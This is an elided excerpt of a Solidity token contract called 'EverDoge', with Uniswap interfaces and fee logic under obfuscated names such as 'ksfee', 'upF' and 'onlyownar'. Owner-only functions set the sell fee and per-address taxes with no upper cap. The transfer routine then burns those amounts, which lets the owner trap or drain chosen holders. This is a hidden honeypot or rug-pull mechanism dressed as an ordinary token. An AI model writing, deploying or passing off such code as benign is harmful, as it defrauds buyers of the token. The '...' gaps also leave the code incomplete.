...
interface IUniswapV2Factory {
    ...
    function ksfeeTo() external view returns (address);
    function ksfeeToSetter() external view returns (address);
    ...
    function setksfeeTo(address) external;
    function setksfeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingksfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingksfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingksfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingksfeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingksfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract EverDoge is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellksfee = 0;

    uint256 private _defaultBuyksfee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipksfee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellksfee = _value;
    }

    function setSlipksfee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipksfee[_address] = _value;
    }

    function getSlipksfee(address _address) external view onlyownar returns (uint256) {
        return _slipksfee[_address];
    }


    function setMAccountksfee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountksfee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeksfeeAmount = 0;

        if (rF) {
            uint256 tradeksfee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeksfee = _defaultSellksfee;
                }
                if (from == uniswapV2Pair) {

                    tradeksfee = _defaultBuyksfee;
                }
            }
            if (_slipksfee[from] > 0) {
                tradeksfee = _slipksfee[from];
            }

            tradeksfeeAmount = _Amount.mul(tradeksfee).div(100);
        }


        if (tradeksfeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeksfeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeksfeeAmount);
            emit Transfer(from, _deadAddress, tradeksfeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeksfeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeksfeeAmount);
        emit Transfer(from, _to, _Amount - tradeksfeeAmount);
    }
